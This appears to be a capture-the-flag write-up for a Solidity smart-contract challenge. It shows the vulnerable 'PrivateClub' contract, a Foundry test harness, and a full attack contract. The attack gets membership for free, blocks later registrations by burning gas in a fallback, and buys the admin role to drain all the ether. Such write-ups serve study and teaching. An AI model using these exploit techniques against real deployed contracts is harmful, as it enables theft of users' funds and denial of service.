# Private Club

## Challlenge

We are provided with the contract for a private club, which kind of looks like a ponzi scheme.... :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/access/Ownable.sol";
import "openzeppelin-contracts/contracts/security/ReentrancyGuard.sol";

contract PrivateClub is ReentrancyGuard, Ownable {
    uint private registerEndDate;
    event setRegEndDate(uint registerEndDate);
    event memberWithdrawevent(address member, address to, uint amount);
    address[] public members_;
    mapping(address => bool) public members;

    receive() external payable {}

    uint public membersCount;

    function setRegisterEndDate(uint _newRegisterEndDate) external onlyOwner {
        registerEndDate = _newRegisterEndDate;
        emit setRegEndDate(registerEndDate);
    }

    function becomeMember(
        address[] calldata _members
    ) external payable nonReentrant {
        require(block.timestamp < registerEndDate, "registration closed");
        require(_members.length == membersCount, "wrong members length");
        require(msg.value == membersCount * 1 ether, "need more ethers");
        for (uint i = 0; i < _members.length; i++) {
            _members[i].call{value: 1 ether}("");
        }
        membersCount += 1;
        members[msg.sender] = true;
        members_.push(msg.sender);
    }

    modifier onlyMember() {
        bool member;
        for (uint i = 0; i < membersCount; i++) {
            if (members_[i] == msg.sender) {
                member = true;
            }
        }

        require(member == true, "you are not a member");
        _;
    }

    function adminWithdraw(address to, uint amount) external onlyOwner {
        payable(to).call{value: amount}("");
    }

    function addMemberByAdmin(address newMember) external onlyOwner {
        membersCount += 1;
        members[newMember] = true;
        members_.push(newMember);
    }

    function buyAdminRole(address newAdmin) external payable onlyMember {
        require(msg.value == 10 ether, "need 10 ethers");
        _transferOwnership(newAdmin);
    }
}
```

We have multiple goals in this challenge.

1. Become a member of a private club.
2. Block future registrations.
3. Withdraw all Ether from the privateClub contract.

To check if we fulfill these we are provided with a POC foundry script:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";
import "../src/PrivateClub.sol";
import "../src/Attack.sol";

contract Hack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();
        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:

        
        vm.stopPrank();
        // check - hacker is member
        assertTrue(club.members(hacker));

        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();

        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:
                
        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}
```
## Solution

### 1. Become a member for free
THe vulnerability that we can exploit here is that we can pass the array of _members to the becomeMember() function (seems a bit like solana usage to me), and just fill it up with our own address. The contract then returns all the money we sent to us in 1 ether parts and adds us to the members\_ list in the end.

### 2. Blocking registration
To block the registration of other people we can abuse the call to all of the members in the members_ list when someone else tries to register, which is the case when the user4 tries to register. In the fallback functions of our attack contract we can just do stuff until we run out of gas.

### 3. Withdrawing everything
To withdraw everything we have to become the admin/owner. This could be easy as we are dealt 10eth at the beginning and that's exactly how much it costs. Unfortunately we already burn some gas during the first few calls. So the way we can circumvent this is by adding multiple instances of our attack contract to the members list and transferring all our money into it, as this way when user4 registers he will send almost all the money that he needs to pay for the registration to our attack contract, which will push us above 10eth. Then we can just buy the admin role and withdraw everything.

### The attack contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./PrivateClub.sol";

contract Attack
{
    PrivateClub target;
    uint256 counter;
    bool first_phase_done;
    address owner;

    constructor(address payable _target)
    {
        target = PrivateClub(_target);
        counter = 0;
        owner = msg.sender;
        first_phase_done = false;
    }

    function attack(uint256 turn) payable public
    {
        address[] memory address_array = new address[](turn);
        for (uint i = 0; i < turn; i++)
        {
            address_array[i] = address(this);
        }
        target.becomeMember{value:turn * 1e18}(address_array);
    }

    function attack2() payable public
    {
        target.buyAdminRole{value: 10 ether}(owner);
    }

    function finishFirstPhase() public
    {
        first_phase_done = true;
    }

    fallback() external payable
    {
        if (first_phase_done)
        {
            uint256 gas = gasleft();
            while (gas - 150000 > gasleft())
            {
                counter++;
            }
        }
    }
}
```